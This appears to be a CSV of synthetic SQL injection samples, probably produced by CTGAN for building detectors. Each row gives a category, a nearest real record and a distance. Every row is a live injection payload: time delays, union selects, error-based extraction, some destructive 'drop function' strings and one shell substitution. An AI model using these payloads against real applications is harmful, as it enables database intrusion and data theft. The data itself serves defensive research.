CTGAN_001029,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R007900,2.8711107437303305
CTGAN_001030,attack,boolean,-6079   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  8708  =  8708,nearest_attack_euclidean,R006486,3.5818404051623056
CTGAN_001031,attack,other,-3084%'   )    )    order by 1--,nearest_attack_euclidean,R001986,4.646270652710512
CTGAN_001032,attack,other,1  )   where 7026  =  7026,nearest_attack_euclidean,R001112,0.9806264776814073
CTGAN_001033,attack,other,select   (  case when   (  3773  =  3722  )   then 3773 else 3773*  (  select 3773 from mysql.db  )   end  )  #,nearest_attack_euclidean,R008482,3.861049014720562
CTGAN_001034,attack,union," select * from users where id  =  1 -@<@ union select null,version  (    )   -- 1",nearest_attack_euclidean,R000643,5.666370233177887
CTGAN_001035,attack,time,1%'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  '%'  =  ',nearest_attack_euclidean,R005390,4.658155355969275
CTGAN_001036,attack,boolean,-4323'   )    )    or 6968  =  1393,nearest_attack_euclidean,R001620,1.8792817440408804
CTGAN_001037,attack,boolean,"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'eflk'  =  'eflk",nearest_attack_euclidean,R003046,3.4794744612791426
CTGAN_001038,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  9348  =  9348",nearest_attack_euclidean,R007681,3.2568864026546924
CTGAN_001039,attack,other, (  case when 2646  =  8520 then 2646 else null end  ) ,nearest_attack_euclidean,R001379,2.0902384051479026
CTGAN_001040,attack,boolean,1'  )   and 2305  =  1934,nearest_attack_euclidean,R006483,1.671260372868088
CTGAN_001041,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",nearest_attack_euclidean,R000694,3.8034265298918624
CTGAN_001042,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R002638,3.6339477046310718
CTGAN_001043,attack,time,1'||  (  select 'ovlx' where 8767  =  8767 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R006221,4.39671348408118
CTGAN_001044,attack,boolean,"1 and elt  (  4249  =  4249,7259  )  -- meef",nearest_attack_euclidean,R005760,2.426270435939429
CTGAN_001045,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,2.6375409487733275
CTGAN_001046,attack,union,"-3566' where 3641  =  3641 union all select 3641,3641,3641,3641,3641#",nearest_attack_euclidean,R003218,2.554655143965067
CTGAN_001047,attack,boolean,"1'  )   as afnt where 4719  =  4719 and elt  (  8224  =  1275,1275  )  --",nearest_attack_euclidean,R004201,2.6631031905307183
CTGAN_001048,attack,time,"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",nearest_attack_euclidean,R004537,2.2980286188992056
CTGAN_001049,attack,boolean,select * from users where id  =  1 %  (  $  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000460,4.8786624147004565
CTGAN_001050,attack,union," select * from users where id  =  1 union select 1||@,version  (    )   -- 1",nearest_attack_euclidean,R000156,5.888413220355632
CTGAN_001051,attack,union,"-8677'||  (  select 'ihpm' from dual where 9571  =  9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",nearest_attack_euclidean,R007135,47.41796971762811
CTGAN_001052,attack,error,1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  6518  =  6518,nearest_attack_euclidean,R007927,4.958801687245207
CTGAN_001053,attack,other,1   )    )    as mlpf where 7425  =  7425,nearest_attack_euclidean,R001024,2.2170031644969863
CTGAN_001054,attack,other,1 where 4844  =  4844,nearest_attack_euclidean,R001409,2.463998155405824
CTGAN_001055,attack,error,"1   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  4924  =  4924",nearest_attack_euclidean,R006246,5.066643600341272
CTGAN_001056,attack,other,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",nearest_attack_euclidean,R007033,8.196585018590907
CTGAN_001057,attack,union,"1   )    )    as berd where 5803  =  5803 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R008150,3.568105593032153
CTGAN_001058,attack,boolean,-4644 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  # upwd,nearest_attack_euclidean,R007532,3.198371856325773
CTGAN_001059,attack,other,select   (  case when   (  9455  =  6007  )   then 9455 else 9455*  (  select 9455 from mysql.db  )   end  )  #,nearest_attack_euclidean,R000849,3.1159546452706834
CTGAN_001060,attack,other,1  )   as hggi where 6511  =  6511,nearest_attack_euclidean,R002700,1.7931636496603203
CTGAN_001061,attack,union,"-4304' where 1005  =  1005 union all select 1005,1005#",nearest_attack_euclidean,R003111,3.108414216386346
CTGAN_001062,attack,error,"1   )    )    as rwsn where 9946  =  9946 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R009009,2.6190211533966594
CTGAN_001063,attack,other,or 'whatever' in   (  'whatever'  ) ,nearest_attack_euclidean,R000348,2.488619527298109
CTGAN_001064,attack,boolean,"1' and elt  (  4249  =  4249,7259  )   and 'nsbj' like 'nsbj",nearest_attack_euclidean,R005620,2.5614695089692825
CTGAN_001065,attack,other,1 where 9872  =  9872,nearest_attack_euclidean,R000894,2.0222988979039433
CTGAN_001066,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'iwmy'  =  'iwmy,nearest_attack_euclidean,R005705,4.4754446559169
CTGAN_001067,attack,error,"1'  )   where 7887  =  7887 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R004238,2.849644916485934
CTGAN_001068,attack,boolean,"1"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and ""wrbs"" like ""wrbs",nearest_attack_euclidean,R001827,5.775601957076006
CTGAN_001069,attack,boolean,"1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'xdui' like 'xdui",nearest_attack_euclidean,R001298,4.117704774886652
CTGAN_001070,attack,error,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""bizm""  =  ""bizm",nearest_attack_euclidean,R008488,5.178199037660096
CTGAN_001071,attack,error,"1"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""krtr"" like ""krtr",nearest_attack_euclidean,R007945,4.0197971434481925
CTGAN_001072,attack,boolean,1  )   and 2006  =  2006,nearest_attack_euclidean,R005698,5.248325911342148
CTGAN_001073,attack,boolean,"1' and make_set  (  8403  =  8403,8899  )   and 'fttd' like 'fttd",nearest_attack_euclidean,R003864,3.753203319636259
CTGAN_001074,attack,other,select case when 7951  =  1147 then 1 else null end--,nearest_attack_euclidean,R002014,2.832082462151671
CTGAN_001075,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R006315,4.255738673350513
CTGAN_001076,attack,time,1'  )   or sleep  (  5  ) ,nearest_attack_euclidean,R002985,1.9554259055462888
CTGAN_001077,attack,union," select * from users where id  =  1 union select 1||@,version  (    )   -- 1",nearest_attack_euclidean,R000156,9.108676248623153
CTGAN_001078,attack,boolean,"1   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8738  =  8738",nearest_attack_euclidean,R002000,2.6289037969439994
CTGAN_001079,attack,union,"-4826 union all select 4532,4532,4532,4532,4532--",nearest_attack_euclidean,R006408,3.093328528243164
CTGAN_001080,attack,union,"1""  )   where 6859  =  6859 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R007867,3.040718005394135
CTGAN_001081,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000246,4.5379513783793355
CTGAN_001082,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,3.2771680034047046
CTGAN_001083,attack,boolean,"1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'khah' like 'khah",nearest_attack_euclidean,R007150,3.845246065748811
CTGAN_001084,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000163,5.273015497639253
CTGAN_001085,attack,other,1'  )   as pudv where 2609  =  2609,nearest_attack_euclidean,R002866,2.670866550960156
CTGAN_001086,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R002133,4.136096168582813
CTGAN_001087,attack,union,"1""  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R005861,7.342081190183658
CTGAN_001088,attack,other,1 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    ) ,nearest_attack_euclidean,R001045,2.0017985077598177
CTGAN_001089,attack,time,"select sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R005356,3.445213888920885
CTGAN_001090,attack,boolean,"-9996' or make_set  (  1237  =  7111,7111  )  ",nearest_attack_euclidean,R002606,3.4760495040111037
CTGAN_001091,attack,error,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'jwbt'  =  'jwbt",nearest_attack_euclidean,R007364,3.5877776745163126
CTGAN_001092,attack,boolean,"1%""  )   and 9764  =  6037 and   (  ""%""  =  """,nearest_attack_euclidean,R007481,5.241856616401664
CTGAN_001093,attack,other,""" or """" """,nearest_attack_euclidean,R000286,6.0483270400176385
CTGAN_001094,attack,error,"1   )    )    as gcvw where 7363  =  7363 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R003014,5.042846211958283
CTGAN_001095,attack,time,"1"" where 1831  =  1831 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R002795,4.815297550193382
CTGAN_001096,attack,boolean,"1 where 8949  =  8949 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R006881,2.9398491368228132
CTGAN_001097,attack,boolean,-9311   )    )    or   (  5065  =  2572  )  *2572 and    (    (   1199  =  1199,nearest_attack_euclidean,R002895,3.4081291353856216
CTGAN_001098,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R007483,5.516039380643572
CTGAN_001099,attack,boolean, or uid like '%,nearest_attack_euclidean,R000205,5.45960716223085
CTGAN_001100,attack,time,"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""cwwv"" like ""cwwv",nearest_attack_euclidean,R006999,3.954415743718797
CTGAN_001101,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'gfll'  =  'gfll",nearest_attack_euclidean,R007122,3.925106081531959
CTGAN_001102,attack,error,"1'||  (  select 'qrle' from dual where 9239  =  9239 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R006375,4.145840533543705
CTGAN_001103,attack,boolean,"1""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R003315,2.993657393653089
CTGAN_001104,attack,union,"-8971'||  (  select 'smyx' where 7970  =  7970 union all select 7970,7970,7970,7970,7970,7970,7970#",nearest_attack_euclidean,R001681,6.6994274116051615
CTGAN_001105,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'krrr'  =  'krrr,nearest_attack_euclidean,R006082,3.802678265434112
CTGAN_001106,attack,error,"1'||  (  select 'adiv' from dual where 9842  =  9842 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",nearest_attack_euclidean,R003996,3.4714928160735252
CTGAN_001107,attack,boolean,"1  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  4003  =  4003",nearest_attack_euclidean,R005054,4.401689475726087
CTGAN_001108,attack,time,1' and sleep  (  5  ) ,nearest_attack_euclidean,R002468,2.1182499264784993
CTGAN_001109,attack,boolean,"1' and make_set  (  2942  =  8200,8200  )   and 'jnhv' like 'jnhv",nearest_attack_euclidean,R001723,2.2179597447901727
CTGAN_001110,attack,boolean,-7636'  )   or 5898  =  8880 and   (  'sjuv'  =  'sjuv,nearest_attack_euclidean,R008413,3.9872574574677273
CTGAN_001111,attack,other,1   )    )    as vcvn where 2106  =  2106,nearest_attack_euclidean,R006768,0.8400469993374313
CTGAN_001112,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R007185,4.1280835280849235
CTGAN_001113,attack,time,select sleep  (  5  )   and    (    (     (  'thqr' like 'thqr,nearest_attack_euclidean,R007870,3.3499935347056504
CTGAN_001114,attack,other,"1',  (  select   (  case when   (  3888  =  3888  )   then   (  select count  (  *  )   from generate_series  (  1,5000000   )    )    else 1/  (  select 0  )   end   )    )   ",nearest_attack_euclidean,R008652,3.8371351937031672
CTGAN_001115,attack,other,end  )  ||',nearest_attack_euclidean,R006985,4.190848797005561
CTGAN_001116,attack,error,"1'+  (  select vvet where 5221  =  5221 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",nearest_attack_euclidean,R008562,4.928873877277565
CTGAN_001117,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R003039,3.4500045295875226
CTGAN_001118,attack,union,"-2766%'   )    )    union all select 4458,4458,4458,4458,4458--",nearest_attack_euclidean,R004177,3.16492270172542
CTGAN_001119,attack,time,1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R008434,3.5861829081050756
CTGAN_001120,attack,boolean,"1%'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  '%'  =  '",nearest_attack_euclidean,R002276,2.5411347409918545
CTGAN_001121,attack,union,"1%' union all select null,null,null,null--",nearest_attack_euclidean,R003342,5.29977406799668
CTGAN_001122,attack,error,"1""  )   as eibf where 5026  =  5026 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",nearest_attack_euclidean,R001129,5.493266068739509
CTGAN_001123,attack,error,"-4291""   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""xyhi""  =  ""xyhi",nearest_attack_euclidean,R000687,5.5602911972509
CTGAN_001124,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000282,17.66488898636394
CTGAN_001125,attack,boolean,1' in boolean mode  )   and   (  8610  =  2985  )  *2985#,nearest_attack_euclidean,R005566,3.1592283999076396
CTGAN_001126,attack,time,1'  )   and sleep  (  5  )  #,nearest_attack_euclidean,R004724,2.9945835563420062
CTGAN_001127,attack,union," select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000385,5.391035080217686
CTGAN_001128,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '",nearest_attack_euclidean,R007249,5.468032035140575
CTGAN_001129,attack,union,"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",nearest_attack_euclidean,R000982,3.431146034256679
CTGAN_001130,attack,error,"1  )   where 9338  =  9338 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R001110,1.9273195992422305
CTGAN_001131,attack,union,"-7043""  )   where 9755  =  9755 union all select 9755,9755,9755,9755,9755,9755#",nearest_attack_euclidean,R007656,3.0010382634879837
CTGAN_001132,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R006817,3.156499419267489
CTGAN_001133,attack,time,1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R001852,5.0245299463886415
CTGAN_001134,attack,boolean, or 1 in   (  select @@version  )  --,nearest_attack_euclidean,R000101,4.452904128185518
CTGAN_001135,attack,error,1'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'cbnc' like 'cbnc,nearest_attack_euclidean,R004363,4.1107217261884035
CTGAN_001136,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000330,5.837666262859913
CTGAN_001137,attack,time,1'||  (  select 'nvvm' from dual where 5567  =  5567 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   ||',nearest_attack_euclidean,R005935,43.25289977967354
CTGAN_001138,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R003853,3.303750096055978
CTGAN_001139,attack,time,1'   )    )    as cpwx where 5378  =  5378 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R003512,3.834148750729193
CTGAN_001140,attack,boolean,1%'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R007933,4.849945728101094
CTGAN_001141,attack,error,"1"" where 7015  =  7015 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R004300,3.864848867527933
CTGAN_001142,attack,error,"1""   )    )    as krro where 1050  =  1050 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R001501,4.255456555955316
CTGAN_001143,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R007483,5.685259897292193
CTGAN_001144,attack,boolean,"1'  )   and elt  (  5245  =  9203,9203  )   and   (  'fhlw' like 'fhlw",nearest_attack_euclidean,R006370,2.485714919466504
CTGAN_001145,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""%""  =  """,nearest_attack_euclidean,R005084,3.793115808827163
CTGAN_001146,attack,other,if  (  4907  =  9581  )   select 4907 else drop function apqw--,nearest_attack_euclidean,R008010,4.20963754614029
CTGAN_001147,attack,other,""" or """" """,nearest_attack_euclidean,R000286,5.168930678387322
CTGAN_001148,attack,union,"1%"" union all select null,null,null,null,null,null#",nearest_attack_euclidean,R005810,4.287989440780583
CTGAN_001149,attack,other,1' where 7036  =  7036,nearest_attack_euclidean,R001285,2.1438077222157426
CTGAN_001150,attack,other,select   (  case when   (  4666  =  4666  )   then 1 else 4666*  (  select 4666 from master..sysdatabases  )   end  )  --,nearest_attack_euclidean,R001931,4.545514815873311
CTGAN_001151,attack,error,"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  # dyed",nearest_attack_euclidean,R001682,4.857783236882729
CTGAN_001152,attack,error,"1'||  (  select 'mwmn' where 5112  =  5112 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",nearest_attack_euclidean,R001472,3.2014691651966256
CTGAN_001153,attack,other,"  (  select 1 from generate_series  (  9352,9352,case when   (  9352  =  9352  )   then 1 else 0 end  )   limit 1  )  ",nearest_attack_euclidean,R002435,3.892476059512547
CTGAN_001154,attack,error,"-7184  )   as fshx where 3408  =  3408 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R003001,1.560731183651997
CTGAN_001155,attack,boolean,"1%'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R005391,3.3489732387340903
CTGAN_001156,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R005273,6.525921261552154
CTGAN_001157,attack,time,"1%"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""%""  =  """,nearest_attack_euclidean,R006048,4.925400777457731
CTGAN_001158,attack,other,1'   )    )    as eymg where 7000  =  7000,nearest_attack_euclidean,R000829,1.4821263399702584
CTGAN_001159,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R003954,3.194337692790673
CTGAN_001160,attack,other, (  select   (  case when   (  5792  =  5792  )   then 5792 else 1/  (  select 0  )   end   )    ) ,nearest_attack_euclidean,R004608,5.496666216982014
CTGAN_001161,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8503  =  8503",nearest_attack_euclidean,R002367,4.861934826876586
CTGAN_001162,attack,union,"-9860  )   where 8743  =  8743 union all select 8743,8743,8743,8743,8743,8743,8743--",nearest_attack_euclidean,R002222,4.155966345454722
CTGAN_001163,attack,boolean,"1' and elt  (  2266  =  7467,7467  )  ",nearest_attack_euclidean,R005837,1.9317218361934754
CTGAN_001164,attack,other,"1,  (  select 9100  =    (  'qqpjq'||  (  select case 9100 when 9100 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ",nearest_attack_euclidean,R007006,3.998120615440103
CTGAN_001165,attack,other,"1,  (  case when 6620  =  3092 then 1 else null end  )  ",nearest_attack_euclidean,R003287,1.975125477440591
CTGAN_001166,attack,error,1'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'hgwt' like 'hgwt,nearest_attack_euclidean,R005052,4.5342699816088885
CTGAN_001167,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000070,4.204656348099475
CTGAN_001168,attack,other,"1,  (  select   (  case when   (  5141  =  5141  )   then   (  ascii  (  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )     )   else 5141/  (  select 0 from   (  values  (  0   )    )     )   end  )   from   (  values  (  0   )    )     )  ",nearest_attack_euclidean,R008559,9.63245840311718
CTGAN_001169,attack,boolean,1%' and 1736  =  4220,nearest_attack_euclidean,R002724,3.779473408023621
CTGAN_001170,attack,other,select   (  case when   (  9746  =  8055  )   then 9746 else 1/  (  select 0  )   end  )  --,nearest_attack_euclidean,R004600,2.747525203858546
CTGAN_001171,attack,boolean,"1%""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R005999,3.8369575290538314
CTGAN_001172,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R003853,4.1619399035765605
CTGAN_001173,attack,other,"1',  (  select * from generate_series  (  5609,5609,case when   (  5609  =  5609  )   then 1 else 0 end  )   limit 1  )  ",nearest_attack_euclidean,R006023,5.873492441868489
CTGAN_001174,attack,union,"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",nearest_attack_euclidean,R005272,8.593084175921518
CTGAN_001175,attack,other,"1',  (  select   (  case when   (  5154  =  5154  )   then 1 else 5154*  (  select 5154 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R005735,4.195979859007154
CTGAN_001176,attack,boolean,"1%""   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R008336,4.6207568380644375
CTGAN_001177,attack,other,"select count  (  *  )   from generate_series  (  1,5000000  )  #",nearest_attack_euclidean,R000928,4.006258307081477
CTGAN_001178,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R003089,4.034655511916257
CTGAN_001179,attack,error,"1""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""obau""  =  ""obau",nearest_attack_euclidean,R005497,3.8644879948593545
CTGAN_001180,attack,time,1'  )   where 7908  =  7908 or sleep  (  5  )  --,nearest_attack_euclidean,R001103,5.6108701421718505
